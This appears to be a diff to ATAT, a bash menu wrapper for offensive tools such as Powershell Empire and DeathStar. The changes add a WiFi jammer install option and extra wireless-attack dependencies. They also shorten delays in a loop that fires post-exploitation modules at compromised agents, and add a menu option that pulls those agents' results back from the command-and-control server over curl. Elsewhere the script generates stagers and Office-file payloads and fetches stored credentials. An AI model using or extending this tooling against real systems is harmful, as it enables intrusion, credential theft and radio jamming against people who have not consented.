@@ -871,8 +871,8 @@ done
   echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"
   echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!\E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 5=Main Menu | 6=QUIT: '
-options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "Main Menu" "Quit") #"HostAPD-WPE via Github"
+PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
+options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "WiFi Jammer Install" "Main Menu" "Quit") #"HostAPD-WPE via Github"
 select opt in "${options[@]}"
 do
     case $opt in
@@ -900,7 +900,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap"
+	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
@@ -1000,8 +1000,8 @@ echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \
 echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 18=Main Menu | 19=QUIT: '
-options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get PSE Stored Credentials" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 19=Main Menu | 20=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1089,9 +1089,10 @@ do
 	for MODULE in $(cat $inputfile)
 	do
 	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_postex.log
-	sleep 90
+	sleep 10
 	done
             echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
 			;;	
 		"Linux/OSX Post-Exploitation")
     inputfile=~/ATAT/PSE_linux_osx_postex.txt
@@ -1100,9 +1101,16 @@ do
 	for MODULE in $(cat $inputfile)
 	do
 	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_postex.log
-	sleep 90
+	sleep 10
 	done
             echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
+			;;
+		"Get Post Ex Results From PSE Agent")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'PSE Agent to Poll: ' useragent; 
+	curl --insecure -i https://$userlistener:$userport/api/agents/$useragent/results?token=$(cat $pseauthtoken)	
+            echo -e "\E[1;34m::::: \e[97m$useragent Results Have Been Polled \E[1;34m:::::"
 			;;
 		"Get PSE Stored Credentials")
     pseauthtoken=~/ATAT/PSE_perm_token.txt
@@ -1134,7 +1142,7 @@ do
     curl --insecure -i https://$userlistener:$userport/api/admin/shutdown?token=$(cat $pseauthtoken)
 		echo -e "\E[1;34m::::: \e[97mPSE RESTful API Has Been Shutdown \E[1;34m:::::"
 			;;
-        "Main Menu")
+		"Main Menu")
            ~/ATAT/ATAT.sh
             ;;
         "Quit")
